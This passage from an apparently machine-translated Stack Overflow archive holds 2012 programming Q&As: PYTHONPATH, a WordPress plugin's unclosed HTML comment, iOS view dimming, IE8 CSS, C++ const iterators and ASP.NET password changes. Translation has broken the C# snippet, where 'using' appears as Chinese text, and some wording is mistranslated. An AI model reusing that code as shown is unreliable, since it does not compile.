> 时间：2012-09-28T21:21:19.210

1.  您应该尝试 export PYTHONPATH='/path/to/your/influence/folder' （或类似的东西，具体取决于您使用的外壳）

2.  在交互式[ipython](http://ipython.org)中尝试这些东西——如果你让它在那里工作，那么很容易让它在代码中工作。如果您是初学者，这通常是最好的方法。

# wordpress - Wordpress“WP Google Plus Connect”插件>选项页面不可见

> ID：12646982
> 
> 赞同：0
> 
> 时间：2012-09-28T20:29:30.730
> 
> 标签：wordpress

因此，我安装了[WP Google Plus Connect](http://wordpress.org/extend/plugins/wp-google-plus-connect/)插件 v 1.0.5.1。但是，当我转到插件的设置页面时，我看到的是![这](../Images/b9ecd7b0a54b640b2197edd25bc31b8a.png) 设置页面没有显示。

我使用 Wordpress v 3.1。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:29:30.730

解决了版本 1.0.5.1 的问题。在`admin.php`插件目录中的**第 60 行**`-->`，从末尾删除。**然后，在第 60 行**和**第 61**行之间创建一条新行并将其放置在`-->`那里。

## 解释

这是一个简单的 HTML 错误。作者似乎想暂时从视图中删除一些设置页面。**因此，他在第 58 行**开始了 HTML 注释。然后，他检查名为的函数是否`wds_bp_check`存在，如果存在，则输出另一个注释掉的链接，并关闭 HTML 注释。

问题是，如果函数 wds_bp_check 不存在，则 HTML 注释不会关闭，并且会继续贯穿页面的其余部分，直到遇到另一个`-->`. 因此，设置页面在那里，但不可见。在适当的地方关闭评论，一切都应该修复=）

# ios - 使背景视图变暗，就像显示 UIAlertView 时一样

> ID：12646992
> 
> 赞同：3
> 
> 时间：2012-09-28T20:30:14.603
> 
> 标签：ios, uiview, background

有什么方法可以在不绘制黑色矩形并使其透明的情况下做到这一点？对不起我的英语不好，我希望你明白我想要什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T21:16:52.180

给定一个名为`backgroundView`

```
backgroundView.backgroundColor = [UIColor blackColor];
backgroundView.alpha = 0.8f;
backgroundView.userInteractionEnabled = NO; 
```

# css - IE 8 中背景图像的定位不同

> ID：12646994
> 
> 赞同：0
> 
> 时间：2012-09-28T20:30:19.373
> 
> 标签：css, internet-explorer

我正在为我们组织的网站添加页脚。它在 Firefox（Mac 和 PC）和 Safari（Mac）中看起来很好。但是，当然，不在 IE 8 中。

我在左侧和中间有两个 div（列），其中有两行链接。在页脚的右侧，我有一个我们想要与顶部、右侧和底部齐平的建筑物的图像。

为了做到这一点，我必须使图像成为页脚背景图像的一部分。页脚位于较大的内容区域内，并且该内容区域的左侧和右侧都有边距或填充。此外，我想要文本下方的一些额外空间，所以我添加了一些填充（防止图像位于页脚的下边缘。

这是我正在处理的测试页面：http: [//americanart.si.edu/collections/index_footer.cfm](http://americanart.si.edu/collections/index_footer.cfm)

我受阻了。任何新鲜的外观将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:50:17.417

背景位于正确的位置，但页脚内的 .col3 覆盖了它。它具有灰色背景色，在智能浏览器中为 0 像素高，但在 IE 中呈现为 19 像素高，即使它没有内容。如果其中没有任何内容，您可能应该删除该 div 。

# c++ - begin() 如何知道要返回哪种返回类型（const 或 non-const）？

> ID：12646998
> 
> 赞同：6
> 
> 时间：2012-09-28T20:30:25.523
> 
> 标签：c++, stl, iterator, std

这完美地工作：

```
list<int> l;
list<int>::const_iterator it;
it = l.begin();
list<int>::iterator it2;
it2 = l.begin(); 
```

我不明白的是如何`list`“知道”它必须返回`iterator begin()`版本或版本`const_iterator begin() const`。

我正在尝试为我的容器（trie）实现迭代器，我遇到了这个问题。C++ 不应该不按返回类型处理差异化（除非使用奇怪的技巧）？

这是一些代码和我得到的编译器错误：

My`Trie<T>`是一个模板化的 trie，可以包含任何类型。我有一个`Trie<int>::iter`非常量迭代器和一个`Trie<int>::const_iter`常量迭代器。`iter begin()`并`const_iter begin() const`在 Trie 类中声明（和定义）。

```
Trie<int> t;
Trie<int>::const_iter it;
it = t.begin(); 
```

错误 ：

```
../test/trie.cpp:181: error: no match for 'operator=' in 'it = Trie<T>::begin() [with T = int]()'
[..path..]/Trie.h:230: note: candidates are: Trie<int>::const_trie_iterator& Trie<int>::const_trie_iterator::operator=(const Trie<int>::const_trie_iterator&) 
```

所以，我相信`begin`不使用非常量版本。

我考虑为非常量迭代器创建一个`operator=(const Trie<T>::const_trie_iterator&)`方法，但我在`STD`lib 中看不到它，我必须对迭代器进行 const_cast。我该怎么办？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-28T20:33:50.380

在标准容器中，非常量迭代器可以隐式转换为 const_iterator。返回的类型仅基于`begin()`被调用的对象/引用的 const-ness，在您的情况下是`iterator`，存在允许稍后分配的转换。

特别是在 23.2.1 通用容器要求表 96 中，它说`X::iterator`必须可转换为`X::const_iterator`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T20:46:14.360

list 知道要返回哪种类型的迭代器，因为定义了两种 begin 方法，一种用于当列表为 const 时，另一种用于当它不是时。声明可能如下所示：

```
template<class T>
class list {
public:
    iterator<T> begin();
    const_iterator<T> begin() const;
} 
```

在以下示例中，将返回第一个非 const 迭代器，因为列表不是 const：

```
void doSomething(list<int> &myList) {
    iterator<int> i = myList.begin();
    ...
} 
```

在下一个示例中，列表被声明为 const，因此将使用返回 const_iterator 的第二个 begin 版本：

```
void doSomethingElse(const list<int> &myList) {
    const_iterator<int> i = myList.begin();
    ....
} 
```

当然，迭代器总是可以强制转换为 const_iterator，因此您可以在任一示例中将 i 声明为 const_iterator，但如果您尝试在第二个示例中将 i 声明为迭代器，您将收到错误，因为 const_iterator不能隐式转换为迭代器。

# asp.net - 在 Web 应用程序中更改 Windows 密码

> ID：12646999
> 
> 赞同：1
> 
> 时间：2012-09-28T20:30:26.627
> 
> 标签：asp.net, .net, c#-4.0, iis, workgroup

我有一个使用 https 和基本身份验证的网站。用户自动针对 Windows 进行身份验证。该网站托管在工作组计算机（不是域成员）上。我正在使用 .NET Framework 4 和 C#

我尝试从网页（在用户通过身份验证后）更改用户的密码，但没有成功。我使用 DirectoryService 尝试了几件事，例如：

```
    使用 (DirectoryEntry directoryEntry = new DirectoryEntry(string.Format(@"WinNT://localhost/{0}, user", userName), domainAndUser, userPassword))
    {
        directoryEntry.Invoke("ChangePassword", new object[] { oldPassword, newPassword });
        directoryEntry.CommitChanges();
    }

```

我收到拒绝访问错误。我想我需要成为管理员才能做到这一点。

我尝试做的事情是否可行以及如何实现？

提前感谢您的回答！

基督教

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T21:34:25.850

您必须在工作组计算机上以管理员身份运行该代码，查看[ASP.NET Impersonation](http://msdn.microsoft.com/en-us/library/xh507fc5%28v=vs.100%29.aspx)和[ASP.NET Runtime Impersonation](http://www.codeproject.com/Articles/107940/Back-to-Basic-ASP-NET-Runtime-Impersonation)